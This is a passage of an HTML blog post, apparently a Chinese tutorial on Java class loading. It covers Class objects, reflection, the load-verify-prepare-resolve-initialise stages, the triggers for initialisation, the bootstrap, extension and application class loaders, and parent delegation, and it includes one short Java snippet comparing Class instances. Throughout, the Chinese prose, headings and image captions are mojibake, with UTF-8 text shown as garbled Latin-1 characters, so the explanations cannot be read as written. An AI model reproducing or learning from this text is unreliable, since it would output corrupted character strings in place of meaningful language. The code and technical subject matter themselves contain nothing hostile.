è½½æœ€ä¸‹å±‚è°ƒç”¨äº†ä¸€ä¸ªç§°ä¸ºfindClassçš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å®ç°äº†å°†classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼Œç„¶åå†é€šè¿‡defineClassæ–¹æ³•å°†å­—èŠ‚ç è½¬æ¢ä¸ºä¸€ä¸ªjava Classå¯¹è±¡ã€‚<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢æ¼”ç¤ºçš„é›†ä¸­æ–¹å¼è·å¾—ä¸€ä¸ªClasså¯¹è±¡</p>
<span id="more"></span>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassLoaderTest1</span> <span class="variable">classLoaderTest1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoaderTest1</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ClassLoaderTest1</span>&gt; aClass = classLoaderTest1.getClass();</span><br><span class="line">        Class&lt;ClassLoaderTest1&gt; classLoaderTest1Class = ClassLoaderTest1.class;</span><br><span class="line">        Class&lt;?&gt; aClass1 = Class.forName(<span class="string">&quot;com.armandhe.javabase.ClassLoaderTest1&quot;</span>);</span><br><span class="line">        System.out.println(aClass1 == classLoaderTest1Class);</span><br><span class="line">        System.out.println(aClass1 == aClass1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/2d78d0aedc7a41aa3edf16fb93accf19.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬çœ‹åˆ°é€šè¿‡ä¸‰è€…è·å¾—åŒä¸€ä¸ªç±»çš„Classå¯¹è±¡æ˜¯ä¸€æ ·çš„ï¼Œè¿™å°±éªŒè¯äº†åŒä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªClasså¯¹è±¡çš„ç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨çœ‹çœ‹ä»–ä»¬çš„ç±»åŠ è½½å™¨å…¶å®ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7080f57b69b4ce44df7b01d962c299df.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åé¢æˆ‘ä»¬å°†ä¼šæ¼”ç¤ºç±»åŠ è½½å™¨ä¸ä¸€æ ·çš„æ•ˆæœã€‚<br>æˆ‘ä»¬å†çœ‹ä¸€ä¸‹ä¸‹é¢çš„æ•ˆæœï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/228af10ce4994de5f98b481360103e02.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæˆ‘ä»¬åŠ è½½äº†ä¸¤ä¸ªåå­—ä¸ä¸€æ ·çš„ç±»ï¼Œå½“ç„¶ä»–ä»¬çš„Classå®ä¾‹æ˜¯ä¸ç›¸ç­‰çš„ï¼Œä¸è¿‡ä»–ä»¬çš„ç±»åŠ è½½å™¨æ˜¯ä¸€æ ·çš„ï¼Œæ ¹æ®ä¸Šé¢çš„ç†è®ºï¼Œåªè¦ç±»åŠ è½½å™¨å’Œå®Œå…¨é™å®šåæœ‰ä¸€ä¸ªä¸ä¸€æ ·åˆ™ä¸¤ä¸ªç±»çš„Classå®ä¾‹å°±æ˜¯ä¸ç›¸ç­‰çš„ã€‚<br>å¯ä»¥ç”¨ä¸‹é¢çš„å›¾æ¥æè¿°ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/341916fed5b2790dc1eeff41a74a758c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h1 id="Javaåå°„æœºåˆ¶"><a href="#Javaåå°„æœºåˆ¶" class="headerlink" title="Javaåå°„æœºåˆ¶"></a>Javaåå°„æœºåˆ¶</h1><p>ä¸Šé¢æåˆ°JVMåœ¨åŠ è½½ç±»çš„æ—¶å€™ä¼šå…ˆåˆ›å»ºè¯¥ç±»çš„Classç±»å®ä¾‹ï¼Œè¯¥å®ä¾‹å­˜å‚¨äº†ä¸è¯¥ç±»æ‰€æœ‰çš„å­—æ®µã€æ–¹æ³•ç­‰ä¿¡æ¯ï¼Œé€šè¿‡è¯¥å®ä¾‹å°±å¯ä»¥ç”Ÿæˆå¯¹åº”çš„ç±»å¯¹è±¡ã€‚åœ¨Javaä¸­Classå®ä¾‹æ˜¯å¯ä»¥äººå·¥ç”Ÿæˆçš„ï¼Œè¿™ä¸€ç‰¹æ€§æ‰“é€šäº†äººå·¥ç”Ÿæˆç±»å¯¹è±¡çš„æ¡æ¢ï¼Œé€šè¿‡è¿™ä¸€ç‰¹æ€§Javaå®ç°äº†åå°„æœºåˆ¶ã€‚<br>æ‰€è°“åå°„å°±æ˜¯åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½è°ƒç”¨å®ƒçš„ä»»æ„æ–¹æ³•å’Œå±æ€§ï¼›å¹¶ä¸”èƒ½æ”¹å˜ä»–çš„å±æ€§ã€‚<br>å…³äºjavaåå°„çš„è¯¦æƒ…å°±ä¸è¯´äº†ï¼Œä½¿ç”¨çš„è¯ä¸»è¦å°±æ˜¯å‡ ä¸ªè·å–å±æ€§ã€æ–¹æ³•ã€æ„é€ æ–¹æ³•çš„æ–¹æ³•ã€‚</p>
<h1 id="Javaç±»åŠ è½½"><a href="#Javaç±»åŠ è½½" class="headerlink" title="Javaç±»åŠ è½½"></a>Javaç±»åŠ è½½</h1><p>Javaçš„ç±»åŠ è½½ä¸€èˆ¬éƒ½è¦ç»è¿‡åŠ è½½-&gt;éªŒè¯-&gt;å‡†å¤‡-&gt;è§£æ-&gt;åˆå§‹åŒ–äº”ä¸ªé˜¶æ®µï¼Œå½“ç„¶ä¸€ä¸ªç±»çš„å®Œæ•´å£°æ˜å‘¨æœŸåº”è¯¥è¿˜è¦åŒ…æ‹¬ä½¿ç”¨åŸŸå¸è½½ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4f036e073b0688a19eef09f7195bd5db.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<ul>
<li><p>åŠ è½½ï¼šç±»åŠ è½½è¿‡ç¨‹çš„ä¸€ä¸ªé˜¶æ®µï¼šé€šè¿‡ä¸€ä¸ªç±»çš„å®Œå…¨é™å®šæŸ¥æ‰¾æ­¤ç±»å­—èŠ‚ç æ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨å­—èŠ‚ç æ–‡ä»¶åˆ›å»ºä¸€ä¸ªClasså¯¹è±¡</p>
</li>
<li><p>éªŒè¯ï¼šç›®çš„åœ¨äºç¡®ä¿Classæ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºè¦æ±‚ï¼Œä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«å®‰å…¨ã€‚ä¸»è¦åŒ…æ‹¬å››ç§éªŒè¯ï¼Œæ–‡ä»¶æ ¼å¼éªŒè¯ï¼Œå…ƒæ•°æ®éªŒè¯ï¼Œå­—èŠ‚ç éªŒè¯ï¼Œç¬¦å·å¼•ç”¨éªŒè¯ã€‚</p>
</li>
<li><p>å‡†å¤‡ï¼šä¸ºç±»å˜é‡(å³staticä¿®é¥°çš„å­—æ®µå˜é‡)åˆ†é…å†…å­˜å¹¶ä¸”è®¾ç½®è¯¥ç±»å˜é‡çš„åˆå§‹å€¼å³0(å¦‚static int i&#x3D;5;è¿™é‡Œåªå°†iåˆå§‹åŒ–ä¸º0ï¼Œè‡³äº5çš„å€¼å°†åœ¨åˆå§‹åŒ–æ—¶èµ‹å€¼)ï¼Œè¿™é‡Œä¸åŒ…å«ç”¨finalä¿®é¥°çš„staticï¼Œå› ä¸ºfinalåœ¨ç¼–è¯‘çš„æ—¶å€™å°±ä¼šåˆ†é…äº†ï¼Œæ³¨æ„è¿™é‡Œä¸ä¼šä¸ºå®ä¾‹å˜é‡åˆ†é…åˆå§‹åŒ–ï¼Œç±»å˜é‡ä¼šåˆ†é…åœ¨æ–¹æ³•åŒºä¸­ï¼Œè€Œå®ä¾‹å˜é‡æ˜¯ä¼šéšç€å¯¹è±¡ä¸€èµ·åˆ†é…åˆ°Javaå †ä¸­ã€‚</p>
</li>
<li><p>è§£æï¼šä¸»è¦å°†å¸¸é‡æ± ä¸­çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹ã€‚ç¬¦å·å¼•ç”¨å°±æ˜¯ä¸€ç»„ç¬¦å·æ¥æè¿°ç›®æ ‡ï¼Œå¯ä»¥æ˜¯ä»»ä½•å­—é¢é‡ï¼Œè€Œç›´æ¥å¼•ç”¨å°±æ˜¯ç›´æ¥æŒ‡å‘ç›®æ ‡çš„æŒ‡é’ˆã€ç›¸å¯¹åç§»é‡æˆ–ä¸€ä¸ªé—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚æœ‰ç±»æˆ–æ¥å£çš„è§£æï¼Œå­—æ®µè§£æï¼Œç±»æ–¹æ³•è§£æï¼Œæ¥å£æ–¹æ³•è§£æ(è¿™é‡Œæ¶‰åŠåˆ°å­—èŠ‚ç å˜é‡çš„å¼•ç”¨ï¼Œå¦‚éœ€æ›´è¯¦ç»†äº†è§£ï¼Œå¯å‚è€ƒã€Šæ·±å…¥Javaè™šæ‹Ÿæœºã€‹)ã€‚</p>
</li>
<li><p>åˆå§‹åŒ–ï¼šç±»åŠ è½½æœ€åé˜¶æ®µï¼Œè‹¥è¯¥ç±»å…·æœ‰è¶…ç±»ï¼Œåˆ™å¯¹å…¶è¿›è¡Œåˆå§‹åŒ–ï¼Œæ‰§è¡Œé™æ€åˆå§‹åŒ–å™¨å’Œé™æ€åˆå§‹åŒ–æˆå‘˜å˜é‡(å¦‚å‰é¢åªåˆå§‹åŒ–äº†é»˜è®¤å€¼çš„staticå˜é‡å°†ä¼šåœ¨è¿™ä¸ªé˜¶æ®µèµ‹å€¼ï¼Œæˆå‘˜å˜é‡ä¹Ÿå°†è¢«åˆå§‹åŒ–)ã€‚</p>
</li>
</ul>
<p>åŠ è½½åé¢çš„ä¸‰ä¸ªæˆªæ–­åˆè¢«ç»Ÿç§°ä¸ºè¿æ¥é˜¶æ®µã€‚<br>å¯¹éªŒè¯é˜¶æ®µçš„è¯´æ˜å¦‚ä¸‹ï¼š</p>
<ul>
<li>æ–‡ä»¶æ ¼å¼éªŒè¯ï¼šå¦‚æ˜¯å¦ä»¥å¹»æ•° 0xCAFEBABE å¼€å¤´ã€ä¸»ã€æ¬¡ç‰ˆæœ¬å·æ˜¯å¦åœ¨å½“å‰è™šæ‹Ÿæœºå¤„ç†èŒƒå›´ä¹‹å†…ã€å¸¸é‡åˆç†æ€§éªŒè¯ç­‰ã€‚<br>æ­¤é˜¶æ®µä¿è¯è¾“å…¥çš„å­—èŠ‚æµèƒ½æ­£ç¡®åœ°è§£æå¹¶å­˜å‚¨äºæ–¹æ³•åŒºä¹‹å†…ï¼Œæ ¼å¼ä¸Šç¬¦åˆæè¿°ä¸€ä¸ª Javaç±»å‹ä¿¡æ¯çš„è¦æ±‚ã€‚</li>
<li>å…ƒæ•°æ®éªŒè¯ï¼šæ˜¯å¦å­˜åœ¨çˆ¶ç±»ï¼Œçˆ¶ç±»çš„ç»§æ‰¿é“¾æ˜¯å¦æ­£ç¡®ï¼ŒæŠ½è±¡ç±»æ˜¯å¦å®ç°äº†å…¶çˆ¶ç±»æˆ–æ¥å£ä¹‹ä¸­è¦æ±‚å®ç°çš„æ‰€æœ‰æ–¹æ³•ï¼Œå­—æ®µã€æ–¹æ³•æ˜¯å¦ä¸çˆ¶ç±»äº§ç”ŸçŸ›ç›¾ç­‰ã€‚<br>ç¬¬äºŒé˜¶æ®µï¼Œä¿è¯ä¸å­˜åœ¨ä¸ç¬¦åˆ Java è¯­è¨€è§„èŒƒçš„å…ƒæ•°æ®ä¿¡æ¯ã€‚</li>
<li>å­—èŠ‚ç éªŒè¯ï¼šé€šè¿‡æ•°æ®æµå’Œæ§åˆ¶æµåˆ†æï¼Œç¡®å®šç¨‹åºè¯­ä¹‰æ˜¯åˆæ³•çš„ã€ç¬¦åˆé€»è¾‘çš„ã€‚ä¾‹å¦‚ä¿è¯è·³è½¬æŒ‡ä»¤ä¸ä¼šè·³è½¬åˆ°æ–¹æ³•ä½“ä»¥å¤–çš„å­—èŠ‚ç æŒ‡ä»¤ä¸Šã€‚</li>
<li>ç¬¦å·å¼•ç”¨éªŒè¯ï¼šåœ¨è§£æé˜¶æ®µä¸­å‘ç”Ÿï¼Œä¿è¯å¯ä»¥å°†ç¬¦å·å¼•ç”¨è½¬åŒ–ä¸ºç›´æ¥å¼•ç”¨ã€‚</li>
</ul>
<p>åœ¨åˆå§‹åŒ–é˜¶æ®µï¼Œå…¶å®å°±æ˜¯æ‰§è¡Œ<code>&lt;clinit&gt;()</code>æ–¹æ³•çš„è¿‡ç¨‹ï¼Œ<code>&lt;clinit&gt;()</code> æ–¹æ³•æ˜¯ç¼–è¯‘å™¨åœ¨ç±»ä¸­æ”¶é›†çš„ç±»å˜é‡çš„èµ‹å€¼åŠ¨ä½œä¸é™æ€ä»£ç å—ä¸­çš„è¯­å¥ç»„åˆçš„ä¸€ä¸ªæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰§è¡Œ<code>&lt;clinit&gt;()</code> æ–¹æ³•å°±ä¼šå¯¹ç±»å˜é‡è¿›è¡Œèµ‹å€¼ä»¥åŠæ‰§è¡Œç±»ä¸­é™æ€ä»£ç å—ä¸­çš„è¯­å¥ã€‚<code>&lt;clinit&gt;()</code> æ–¹æ³•å¹¶ä¸ä¼šæ˜¾ç¤ºçš„è°ƒç”¨çˆ¶ç±»çš„<code>&lt;clinit&gt;()</code> æ–¹æ³•è€Œæ˜¯éšå¼å¾—è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨åˆå§‹åŒ–æ—¶æ‰‹å·¥å»è°ƒç”¨çˆ¶ç±»çš„<code>&lt;clinit&gt;()</code> æ–¹æ³•ï¼Œjvmä¼šä¿è¯çˆ¶ç±»çš„<code>&lt;clinit&gt;()</code> æ–¹æ³•åœ¨å­ç±»çš„<code>&lt;clinit&gt;()</code> æ–¹æ³•ä¹‹å‰æ‰§è¡Œå®Œæ¯•ã€‚å½“ç„¶æ¥å£ä¾‹å¤–ï¼Œå‡ å£ä¸éœ€è¦è°ƒç”¨çˆ¶ç±»çš„<code>&lt;clinit&gt;()</code> æ–¹æ³•ï¼Œé™¤éåœ¨ä½¿ç”¨åˆ°çˆ¶æ¥å£ä¸­çš„é™æ€æ ‡é‡æ—¶æ‰éœ€è¦è¿›è¡Œè°ƒç”¨ã€‚<br>å½“ä¸€ä¸ªç±»ä¸­æ²¡æœ‰é™æ€ä»£ç å—ä»¥åŠç±»å˜é‡çš„å¤åˆ¶æ“ä½œæ—¶ï¼Œ<code>&lt;clinit&gt;()</code> å¯ä»¥ä¸å­˜åœ¨ã€‚<br>JVMä¼šä¿è¯ä¸€ä¸ªç±»çš„<code>&lt;clinit&gt;()</code> æ–¹æ³•åœ¨å¤šçº¿ç¨‹ä¸­åªè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œ<code>&lt;clinit&gt;()</code> æ—¶å…¶ä»–çº¿ç¨‹éƒ½éœ€é˜»å¡ç­‰å¾…ï¼Œç›´åˆ°å½“å‰çº¿ç¨‹<code>&lt;clinit&gt;()</code> æ‰§è¡Œå®Œæ¯•ã€‚</p>
<h2 id="ç±»åŠ è½½çš„æ—¶æœº"><a href="#ç±»åŠ è½½çš„æ—¶æœº" class="headerlink" title="ç±»åŠ è½½çš„æ—¶æœº"></a>ç±»åŠ è½½çš„æ—¶æœº</h2><p>å¯¹äºåˆå§‹åŒ–é˜¶æ®µï¼Œè™šæ‹Ÿæœºè§„èŒƒè§„å®šäº†æœ‰ä¸”åªæœ‰ 5 ç§æƒ…å†µå¿…é¡»ç«‹å³å¯¹ç±»è¿›è¡Œâ€œåˆå§‹åŒ–â€ï¼ˆè€ŒåŠ è½½ã€éªŒè¯ã€å‡†å¤‡è‡ªç„¶éœ€è¦åœ¨æ­¤ä¹‹å‰å¼€å§‹ï¼‰ï¼š</p>
<ul>
<li>é‡åˆ°newã€getstatic å’Œ putstatic æˆ– invokestatic è¿™4æ¡å­—èŠ‚ç æŒ‡ä»¤æ—¶ï¼Œå¦‚æœç±»æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶åˆå§‹åŒ–ã€‚å¯¹åº”åœºæ™¯æ˜¯ï¼šä½¿ç”¨ new å®ä¾‹åŒ–å¯¹è±¡ã€è¯»å–æˆ–è®¾ç½®ä¸€ä¸ªç±»çš„é™æ€å­—æ®µï¼ˆè¢« final ä¿®é¥°ã€å·²åœ¨ç¼–è¯‘æœŸæŠŠç»“æœæ”¾å…¥å¸¸é‡æ± çš„é™æ€å­—æ®µé™¤å¤–ï¼‰ã€ä»¥åŠè°ƒç”¨ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•ã€‚</li>
<li>å¯¹ç±»è¿›è¡Œåå°„è°ƒç”¨çš„æ—¶å€™ï¼Œå¦‚æœç±»æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶åˆå§‹åŒ–ã€‚</li>
<li>å½“åˆå§‹åŒ–ç±»çš„çˆ¶ç±»è¿˜æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶çˆ¶ç±»çš„åˆå§‹åŒ–ã€‚ï¼ˆè€Œä¸€ä¸ªæ¥å£åœ¨åˆå§‹åŒ–æ—¶ï¼Œå¹¶ä¸è¦æ±‚å…¶çˆ¶æ¥å£å…¨éƒ¨éƒ½å®Œæˆäº†åˆå§‹åŒ–ï¼‰</li>
<li>è™šæ‹Ÿæœºå¯åŠ¨æ—¶ï¼Œç”¨æˆ·éœ€è¦æŒ‡å®šä¸€ä¸ªè¦æ‰§è¡Œçš„ä¸»ç±»ï¼ˆåŒ…å« main() æ–¹æ³•çš„é‚£ä¸ªç±»ï¼‰ï¼Œè™šæ‹Ÿæœºä¼šå…ˆåˆå§‹åŒ–è¿™ä¸ªä¸»ç±»ã€‚</li>
<li>å½“ä½¿ç”¨ JDK 1.7 çš„åŠ¨æ€è¯­è¨€æ”¯æŒæ—¶ï¼Œå¦‚æœä¸€ä¸ª java.lang.invoke.MethodHandle å®ä¾‹æœ€åçš„è§£æç»“æœ REF_getStaticã€REF_putStaticã€REF_invokeStatic çš„æ–¹æ³•å¥æŸ„ï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•å¥æŸ„æ‰€å¯¹åº”çš„ç±»æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶åˆå§‹åŒ–ã€‚<br>ä»¥ä¸Šè¿™ 5 ç§åœºæ™¯ä¸­çš„è¡Œä¸ºç§°ä¸ºå¯¹ä¸€ä¸ªç±»è¿›è¡Œä¸»åŠ¨å¼•ç”¨ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ‰€æœ‰å¼•ç”¨ç±»çš„æ–¹å¼éƒ½ä¸ä¼šè§¦å‘åˆå§‹åŒ–ï¼Œç§°ä¸ºè¢«åŠ¨å¼•ç”¨ï¼Œä¾‹å¦‚ï¼š</li>
<li>é€šè¿‡å­ç±»å¼•ç”¨çˆ¶ç±»çš„é™æ€å­—æ®µï¼Œä¸ä¼šå¯¼è‡´å­ç±»åˆå§‹åŒ–ã€‚</li>
<li>é€šè¿‡æ•°ç»„å®šä¹‰æ¥å¼•ç”¨ç±»ï¼Œä¸ä¼šè§¦å‘æ­¤ç±»çš„åˆå§‹åŒ–ã€‚MyClass[] cs &#x3D; new MyClass[10];</li>
<li>å¸¸é‡åœ¨ç¼–è¯‘é˜¶æ®µä¼šå­˜å…¥è°ƒç”¨ç±»çš„å¸¸é‡æ± ä¸­ï¼Œæœ¬è´¨ä¸Šå¹¶æ²¡æœ‰ç›´æ¥å¼•ç”¨åˆ°å®šä¹‰å¸¸é‡çš„ç±»ï¼Œå› æ­¤ä¸ä¼šè§¦å‘å®šä¹‰å¸¸é‡çš„ç±»çš„åˆå§‹åŒ–ã€‚</li>
</ul>
<h2 id="ç±»åŠ è½½"><a href="#ç±»åŠ è½½" class="headerlink" title="ç±»åŠ è½½"></a>ç±»åŠ è½½</h2><p>ç±»åŠ è½½å°±æ˜¯åŠ è½½å™¨æ›´å…·ä¸€ä¸ªç±»çš„å®Œå…¨é™å®šåæ¥è¯»å–æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµåˆ°JVMä¸­ï¼Œç„¶åè½¬æ¢ä¸ºä¸€ä¸ªä¸ç›®æ ‡ç±»å¯¹åº”çš„Classå®ä¾‹å¯¹è±¡ã€‚åœ¨JVMä¸­æä¾›äº†ä¸‰ç§å†…ç½®çš„ç±»åŠ è½½å™¨ï¼Œå¯åŠ¨ç±»åŠ è½½å™¨ã€æ‰©å±•ç±»åŠ è½½å™¨ã€åº”ç”¨ç±»åŠ è½½å™¨ã€‚</p>
<h3 id="å¯åŠ¨ç±»åŠ è½½å™¨"><a href="#å¯åŠ¨ç±»åŠ è½½å™¨" class="headerlink" title="å¯åŠ¨ç±»åŠ è½½å™¨"></a>å¯åŠ¨ç±»åŠ è½½å™¨</h3><p>å¯åŠ¨ç±»åŠ è½½å™¨ç”¨æ¥åŠ è½½JVMè‡ªèº«éœ€è¦çš„ç±»ï¼Œè¿™ä¸ªç±»åŠ è½½å™¨ä½¿ç”¨C++å®ç°ï¼Œæ²¡æœ‰çˆ¶ç±»ï¼Œå…¶çˆ¶åŠ è½½å™¨ä¸ºnullï¼Œè´Ÿè´£å°†%JAVAHOME%&#x2F;libä¸‹é¢çš„æ ¸å¿ƒç±»åº“æˆ–è€…-X bootclasspathå‚æ•°æŒ‡å®šè·¯å¾„ä¸‹çš„jaråŒ…åŠ è½½åˆ°å†…å­˜ä¸­ã€‚å¯åŠ¨ç±»è®°è½½å™¨åªåŠ è½½javaã€javaxã€sunç­‰å¼€å¤´çš„ç±»ã€‚å¦‚æœç°åœ¨æˆ‘è¦åŠ è½½ä¸€ä¸ªjava.lang.Stringçš„ç±»ï¼Œä½†è¯¥ç±»ä¸åœ¨ä¸Šè¿°ç›®å½•é‡Œé¢ï¼Œå› ä¸ºåŒäº²å§”æ´¾æœºåˆ¶çš„åŸå› ï¼Œå…¶åŠ è½½æƒé™ä¼šè¢«å‘é€åˆ°å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œä½†æ˜¯å› ä¸ºå…¶ä¸åœ¨ä¸Šè¿°ç›®å½•ä¸‹é¢ï¼Œæ‰€ä»¥ä¸ä¼šè¢«åŠ è½½ã€‚è¿™å°±ä¿è¯äº†javaçš„æ ¸å¿ƒç±»åº“ä¸è¢«æ±¡æŸ“ä¸ç¯¡æ”¹ï¼Œè¿™å°±æ˜¯åŒäº²å§”æ´¾æœºåˆ¶çš„é­…åŠ›ã€‚</p>
<h3 id="æ‰©å±•ç±»åŠ è½½å™¨"><a href="#æ‰©å±•ç±»åŠ è½½å™¨" class="headerlink" title="æ‰©å±•ç±»åŠ è½½å™¨"></a>æ‰©å±•ç±»åŠ è½½å™¨</h3><p>æ‰©å±•ç±»åŠ è½½å™¨æœ‰ExtClassLoaderå®ç°ï¼ŒExtClassLoaderæ˜¯sun.misc.Launcherçš„å†…éƒ¨é™æ€ç±»ã€‚å…¶è´Ÿè´£åŠ è½½%JAVA_HOME%&#x2F;lib&#x2F;extç›®å½•ä¸‹æˆ–è€…ç”±å‘½ä»¤-Djava.ext.jaræŒ‡å®šçš„è·¯å¾„ä¸­çš„ç±»åº“ã€‚</p>
<h3 id="ç³»ç»Ÿç±»åŠ è½½å™¨"><a href="#ç³»ç»Ÿç±»åŠ è½½å™¨" class="headerlink" title="ç³»ç»Ÿç±»åŠ è½½å™¨"></a>ç³»ç»Ÿç±»åŠ è½½å™¨</h3><p>ä¹Ÿå«ä½œåº”ç”¨ç±»åŠ è½½å™¨ï¼Œç”±sun.misc.Launcher$AppClassLoaderå®ç°ã€‚å®ƒè´Ÿè´£åŠ è½½ç³»ç»Ÿç±»è·¯å¾„java -classpathæˆ–-D java.class.path æŒ‡å®šè·¯å¾„ä¸‹çš„ç±»åº“ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»å¸¸ç”¨åˆ°çš„classpathè·¯å¾„ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¯¥ç±»åŠ è½½æ˜¯ç¨‹åºä¸­é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œé€šè¿‡ClassLoader#getSystemClassLoader()æ–¹æ³•å¯ä»¥è·å–åˆ°è¯¥ç±»åŠ è½½å™¨ã€‚</p>
<h3 id="åŒäº²å§”æ´¾æœºåˆ¶"><a href="#åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="åŒäº²å§”æ´¾æœºåˆ¶"></a>åŒäº²å§”æ´¾æœºåˆ¶</h3><p>åŒäº²å§”æ´¾æ¨¡å¼è¦æ±‚é™¤äº†é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨å¤–ï¼Œå…¶ä½™çš„ç±»åŠ è½½å™¨éƒ½åº”å½“æœ‰è‡ªå·±çš„çˆ¶ç±»åŠ è½½å™¨ï¼Œè¯·æ³¨æ„åŒäº²å§”æ´¾æ¨¡å¼ä¸­çš„çˆ¶å­å…³ç³»å¹¶éé€šå¸¸æ‰€è¯´çš„ç±»ç»§æ‰¿å…³ç³»ï¼Œè€Œæ˜¯é‡‡ç”¨ç»„åˆå…³ç³»æ¥å¤ç”¨çˆ¶ç±»åŠ è½½å™¨çš„ç›¸å…³ä»£ç ï¼Œç±»åŠ è½½å™¨é—´çš„å…³ç³»å¦‚ä¸‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e9f6babf2c9e05d5b3a8d7c37ebe03e9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åŒäº²å§”æ´¾æ¨¡å¼æ˜¯åœ¨Java 1.2åå¼•å…¥çš„ï¼Œå…¶å·¥ä½œåŸç†çš„æ˜¯ï¼Œå¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½è¯·æ±‚ï¼Œå®ƒå¹¶ä¸ä¼šè‡ªå·±å…ˆå»åŠ è½½ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ‰˜ç»™çˆ¶ç±»çš„åŠ è½½å™¨å»æ‰§è¡Œï¼Œå¦‚æœçˆ¶ç±»åŠ è½½å™¨è¿˜å­˜åœ¨å…¶çˆ¶ç±»åŠ è½½å™¨ï¼Œåˆ™è¿›ä¸€æ­¥å‘ä¸Šå§”æ‰˜ï¼Œä¾æ¬¡é€’å½’ï¼Œè¯·æ±‚æœ€ç»ˆå°†åˆ°è¾¾é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œå¦‚æœçˆ¶ç±»åŠ è½½å™¨å¯ä»¥å®Œæˆç±»åŠ è½½ä»»åŠ¡ï¼Œå°±æˆåŠŸè¿”å›ï¼Œå€˜è‹¥çˆ¶ç±»åŠ è½½å™¨æ— æ³•å®Œæˆæ­¤åŠ è½½ä»»åŠ¡ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚<br>é‡‡ç”¨åŒäº²å§”æ´¾æ¨¡å¼çš„æ˜¯å¥½å¤„æ˜¯Javaç±»éšç€å®ƒçš„ç±»åŠ è½½å™¨ä¸€èµ·å…·å¤‡äº†ä¸€ç§å¸¦æœ‰ä¼˜å…ˆçº§çš„å±‚æ¬¡å…³ç³»ï¼Œé€šè¿‡è¿™ç§å±‚çº§å…³å¯ä»¥é¿å…ç±»çš„é‡å¤åŠ è½½ï¼Œå½“çˆ¶äº²å·²ç»åŠ è½½äº†è¯¥ç±»æ—¶ï¼Œå°±æ²¡æœ‰å¿…è¦å­ClassLoaderå†åŠ è½½ä¸€æ¬¡ã€‚å…¶æ¬¡æ˜¯è€ƒè™‘åˆ°å®‰å…¨å› ç´ 